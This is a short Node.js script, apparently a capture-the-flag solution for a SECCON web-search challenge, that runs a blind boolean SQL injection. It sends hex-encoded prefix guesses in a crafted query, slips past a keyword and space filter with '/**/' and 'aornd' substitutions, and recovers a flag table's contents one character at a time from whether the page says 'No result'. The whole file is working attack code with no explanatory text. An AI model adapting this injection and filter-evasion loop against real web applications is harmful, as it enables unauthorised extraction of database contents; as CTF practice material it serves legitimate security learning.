const axios = require('axios').default;


function strToHex(str) {
  let ret = '';
  for (var i = 0; i < str.length; i++) {
    ret += str.charCodeAt(i).toString(16);
  }
  return ret;
}


const URL = "http://web-search.chal.seccon.jp";
async function guessSubStr(subStr) {
  let hexSubStr = strToHex(subStr);
  let query = `'and (select count(piece) from flag where hex(piece) >= '${hexSubStr}') = 1; #`;
  let escQuery = query.replace(/ /g, '/**/').replace('and', 'aornd');
  // console.log(escQuery);
  const res = await axios.get(URL, {
    params: {
      q: escQuery,
    }
  });
  if (res.data.includes("No result"))
    return false;
  else
    return true;
}


async function main() {
  let flag = '';
  let i = 0;
  while (true) {
    for (i = 0x7d; i >= 0x20; i--) {
      let tmp = flag + String.fromCharCode(i);
      console.log("Test: " + tmp);
      var isCorrect = await guessSubStr(tmp);
      if (isCorrect) {
        flag = tmp;
        break;
      }
    }
    if (i === 0x1f) {
      console.log("failed");
      break;
    }
    if (flag.charAt(flag.length-1) === '}')
      break;
  }
  console.log('flag: ' + flag);
}


main();
